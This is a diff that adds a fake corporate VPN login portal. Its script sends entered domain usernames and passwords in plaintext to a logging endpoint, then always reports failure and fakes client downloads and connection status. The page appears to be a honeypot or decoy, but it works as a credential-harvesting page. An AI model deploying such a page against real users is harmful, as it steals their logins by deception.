@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VPN Access Portal - Secured Foundations LLC
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        .vpn-container {
+            background: white;
+            margin: 2rem auto;
+            padding: 3rem;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            max-width: 800px;
+        }
+        .vpn-status {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 2rem;
+            border: 1px solid #f5c6cb;
+            text-align: center;
+        }
+        .vpn-status.connected {
+            background: #d4edda;
+            color: #155724;
+            border-color: #c3e6cb;
+        }
+        .config-section {
+            background: #f8f9fa;
+            padding: 2rem;
+            border-radius: 10px;
+            margin: 2rem 0;
+            border-left: 4px solid #667eea;
+        }
+        .download-links {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .download-btn {
+            padding: 1rem;
+            background: #667eea;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            text-align: center;
+            transition: background 0.3s ease;
+        }
+        .download-btn:hover {
+            background: #5a67d8;
+        }
+        .server-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+        .server-card {
+            background: white;
+            padding: 1.5rem;
+            border: 1px solid #e9ecef;
+            border-radius: 8px;
+        }
+        .credential-form {
+            background: #fff3cd;
+            padding: 2rem;
+            border-radius: 10px;
+            border: 1px solid #ffeaa7;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <img src="logo.svg" alt="Secured Foundations LLC" width="180">
+            </div>
+            <nav class="nav">
+                <a href="index.html">Home</a>
+                <a href="#" class="active">VPN Access</a>
+                <a href="helpdesk.html">IT Support</a>
+                <a href="logout.html">Logout</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="main">
+        <div class="vpn-container">
+            <h1>🔒 VPN Access Portal</h1>
+            <p>Secure remote access to Secured Foundations LLC network resources</p>
+            
+            <div class="vpn-status" id="vpnStatus">
+                <strong>Status:</strong> Disconnected - Authentication Required
+            </div>
+            
+            <div class="credential-form">
+                <h3>🔐 VPN Authentication</h3>
+                <p>Enter your network credentials to generate VPN configuration</p>
+                
+                <form id="vpnForm">
+                    <div class="form-group">
+                        <label for="networkUser">Network Username (domain\\username)</label>
+                        <input type="text" id="networkUser" name="networkUser" placeholder="SECUREDFOUNDATIONS\\jsmith" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="networkPass">Network Password</label>
+                        <input type="password" id="networkPass" name="networkPass" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="vpnType">VPN Type</label>
+                        <select id="vpnType" name="vpnType" style="width: 100%; padding: 1rem; border: 2px solid #e1e5e9; border-radius: 8px;">
+                            <option value="ssl">SSL VPN (Recommended)</option>
+                            <option value="ipsec">IPSec VPN</option>
+                            <option value="pptp">PPTP (Legacy)</option>
+                        </select>
+                    </div>
+                    <button type="submit" class="login-btn">Generate VPN Config</button>
+                </form>
+            </div>
+            
+            <div class="config-section">
+                <h3>📋 VPN Configuration</h3>
+                <p>Download the appropriate client for your operating system:</p>
+                
+                <div class="download-links">
+                    <a href="#" class="download-btn" onclick="logDownload('windows')">🪟 Windows Client</a>
+                    <a href="#" class="download-btn" onclick="logDownload('mac')">🍎 macOS Client</a>
+                    <a href="#" class="download-btn" onclick="logDownload('linux')">🐧 Linux Client</a>
+                    <a href="#" class="download-btn" onclick="logDownload('mobile')">📱 Mobile Apps</a>
+                </div>
+            </div>
+            
+            <div class="server-info">
+                <div class="server-card">
+                    <h4>🌐 Primary VPN Server</h4>
+                    <p><strong>Hostname:</strong> vpn1.securedfoundations.com</p>
+                    <p><strong>IP Address:</strong> 203.0.113.45</p>
+                    <p><strong>Port:</strong> 443 (SSL), 1723 (PPTP)</p>
+                    <p><strong>Status:</strong> <span style="color: green;">Online</span></p>
+                </div>
+                
+                <div class="server-card">
+                    <h4>🔄 Backup VPN Server</h4>
+                    <p><strong>Hostname:</strong> vpn2.securedfoundations.com</p>
+                    <p><strong>IP Address:</strong> 203.0.113.67</p>
+                    <p><strong>Port:</strong> 443 (SSL), 1723 (PPTP)</p>
+                    <p><strong>Status:</strong> <span style="color: orange;">Standby</span></p>
+                </div>
+            </div>
+            
+            <div class="config-section">
+                <h3>⚠️ Security Requirements</h3>
+                <ul>
+                    <li>VPN access requires valid domain credentials</li>
+                    <li>Multi-factor authentication is enforced</li>
+                    <li>All VPN traffic is monitored and logged</li>
+                    <li>Maximum session time: 8 hours</li>
+                    <li>Split tunneling is disabled for security</li>
+                </ul>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2024 Secured Foundations LLC. VPN Portal v3.2.1</p>
+            <p><strong>IT Support:</strong> For VPN issues, contact support@securedfoundations.com</p>
+        </div>
+    </footer>
+    
+    <script>
+        document.getElementById('vpnForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const networkUser = document.getElementById('networkUser').value;
+            const networkPass = document.getElementById('networkPass').value;
+            const vpnType = document.getElementById('vpnType').value;
+            
+            // Log the credential attempt
+            fetch('/api/vpn-access', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    network_username: networkUser,
+                    network_password: networkPass,
+                    vpn_type: vpnType,
+                    user_agent: navigator.userAgent,
+                    page: 'vpn_portal'
+                })
+            }).catch(() => {});
+            
+            // Show loading state
+            const btn = document.querySelector('.login-btn');
+            btn.innerHTML = '<span class="loading"></span> Authenticating...';
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                alert('Authentication failed. Please verify your domain credentials.');
+                btn.innerHTML = 'Generate VPN Config';
+                btn.disabled = false;
+            }, 3000);
+        });
+        
+        function logDownload(platform) {
+            fetch('/api/vpn-download', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    platform: platform,
+                    user_agent: navigator.userAgent,
+                    page: 'vpn_portal'
+                })
+            }).catch(() => {});
+            
+            // Simulate download
+            alert(`VPN client for ${platform} is not available. Contact IT support.`);
+        }
+        
+        // Simulate periodic status updates
+        let statusConnected = false;
+        setInterval(() => {
+            if (Math.random() < 0.1) { // 10% chance to change status
+                statusConnected = !statusConnected;
+                const statusDiv = document.getElementById('vpnStatus');
+                if (statusConnected) {
+                    statusDiv.innerHTML = '<strong>Status:</strong> Connected - Session Active';
+                    statusDiv.className = 'vpn-status connected';
+                } else {
+                    statusDiv.innerHTML = '<strong>Status:</strong> Disconnected - Authentication Required';
+                    statusDiv.className = 'vpn-status';
+                }
+            }
+        }, 15000);
+    </script>
+</body>
+</html>
